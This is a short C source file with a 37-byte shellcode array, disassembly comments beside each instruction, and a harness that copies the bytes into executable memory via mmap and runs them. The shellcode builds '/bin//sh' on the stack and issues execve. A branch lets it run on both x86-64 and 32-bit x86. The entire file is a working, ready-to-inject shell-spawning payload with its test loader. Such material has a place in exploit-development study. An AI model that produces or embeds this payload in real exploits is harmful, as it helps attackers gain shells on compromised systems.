#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <sys/mman.h>

#define SHX_SIZE 37

char SHX[] = {
  /* 0000 */ "\x31\xf6"                     /* xor esi, esi                    */
  /* 0002 */ "\xf7\xe6"                     /* mul esi                         */
  /* 0004 */ "\x52"                         /* push rdx                        */
  /* 0005 */ "\x52"                         /* push rdx                        */
  /* 0006 */ "\x52"                         /* push rdx                        */
  /* 0007 */ "\x54"                         /* push rsp                        */
  /* 0008 */ "\x5b"                         /* pop rbx                         */
  /* 0009 */ "\x53"                         /* push rbx                        */
  /* 000A */ "\x5f"                         /* pop rdi                         */
  /* 000B */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 0011 */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0018 */ "\x40\x75\x04"                 /* jnz 0x1f                        */
  /* 001B */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 001D */ "\x0f\x05"                     /* syscall                         */
  /* 001F */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0021 */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 0023 */ "\xcd\x80"                     /* int 0x80                        */
};

void xcode(char *s, int len)
{
  void *bin;

  bin=mmap (0, len, 
      PROT_EXEC | PROT_WRITE | PROT_READ, 
      MAP_ANON  | MAP_PRIVATE, -1, 0);  

  memcpy (bin, s, len);
  
  // execute
  ((void(*)())bin)();
    
  munmap (bin, len);  
}

int main(void)
{
  xcode (SHX, SHX_SIZE);
  return 0;  
}
